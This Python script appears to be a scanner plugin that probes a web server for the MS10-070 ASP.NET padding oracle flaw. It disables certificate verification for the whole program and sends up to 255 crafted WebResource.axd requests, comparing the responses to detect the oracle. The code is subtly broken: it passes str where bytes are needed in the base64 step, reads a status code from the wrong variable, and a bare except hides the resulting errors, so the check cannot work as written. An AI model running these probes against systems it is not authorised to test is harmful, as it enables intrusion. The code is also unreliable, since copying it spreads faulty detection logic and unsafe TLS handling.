# -*- coding:utf-8 -*-

import base64
import urllib.request, urllib.error, urllib.parse
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    timeout = 5
    print('testing if ms10070 .NET Padding Oracle vul')
    try:
        res = urllib.request.urlopen(url, timeout=timeout).read().decode('utf-8','ignore')
        if 'WebResource.axd?d=' in res:
            error_i = 0
            bglen = 0
            for k in range(0, 255):
                IV = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + chr(k)
                bgstr = 'A' * 21 + '1'
                enstr = base64.b64encode(IV).replace('=', '').replace('/', '-').replace('+', '-')
                exp_url = "%s/WebResource.axd?d=%s" % (url, enstr + bgstr)
                try:
                    request = urllib.request.Request(exp_url)
                    res_2 = urllib.request.urlopen(request, timeout=timeout)
                    res_html = res_2.read().decode('utf-8','ignore')
                    res_code = res.code
                except urllib.error.HTTPError as e:
                    res_html = e.read().decode('utf-8','ignore')
                    res_code = e.code
                except urllib.error.URLError as e:
                    error_i += 1
                    if error_i >= 3:
                        msg = 'There is no ms10070 .NET Padding Oracle vul'
                        number = 'v0'
                        return False,url,number,msg
                except:
                    msg = 'There is no ms10070 .NET Padding Oracle vul'
                    number = 'v0'
                    return False,url,number,msg
                if int(res_code) == 200 or int(res_code) == 500:
                    if k == 0:
                        bgcode = int(res_code)
                        bglen = len(res_html)
                    else:
                        necode = int(res_code)
                        if (bgcode != necode) or (bglen != len(res_html)):
                            msg = 'There is ms10070 .NET Padding Oracle vul on url: ' +url+ ' .'
                            number = 'v28'
                            print(msg)
                            return True,url,number,msg
                else:
                    msg = 'There is no ms10070 .NET Padding Oracle vul'
                    number = 'v0'
                    return False,url,number,msg
        else:
            msg = 'There is no ms10070 .NET Padding Oracle vul'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg